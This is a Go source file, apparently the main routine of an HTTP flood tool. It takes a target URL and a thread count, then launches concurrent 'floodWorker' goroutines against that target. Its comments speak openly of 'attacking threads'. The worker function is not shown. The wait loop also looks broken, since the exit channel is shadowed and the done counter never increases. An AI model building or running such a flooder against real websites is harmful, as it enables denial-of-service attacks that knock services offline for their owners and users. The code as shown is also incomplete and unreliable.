package main

import (
	"fmt"
	"gopkg.in/alecthomas/kingpin.v2"
	"log"
	"net/url"
)

//Command line args
var (
	verbose = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
	threads = kingpin.Flag("threads", "Amount of concurrent attacking threads.").Default("8").Short('t').Int()
	target  = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
)

//Attack stats variables
var (
	totalRequestsSent int
	threadCounter     int
	threadDoneCounter int
	threadExit        chan bool
)

func main() {
	//Parse arguments
	kingpin.Parse()
	u, err := url.Parse(*target)
	if err != nil {
		log.Fatal(err) //URL Invalid
	}

	if !((u.Scheme == "http") || (u.Scheme == "https")) {
		log.Fatal("URL scheme unsupported")
	}

	//Reflect arguments
	if *verbose {
		fmt.Printf("URL => %s\n", *target)
		fmt.Printf("Threads => %d\n", *threads)
	}

	threadExit := make(chan bool)

	//Start flood workers
	for threadCounter < *threads {
		go floodWorker(threadCounter, *u)
		threadCounter += 1
	}

	//Wait for workers to finish before exit
	for threadDoneCounter < *threads {
		<-threadExit
	}
	return
}
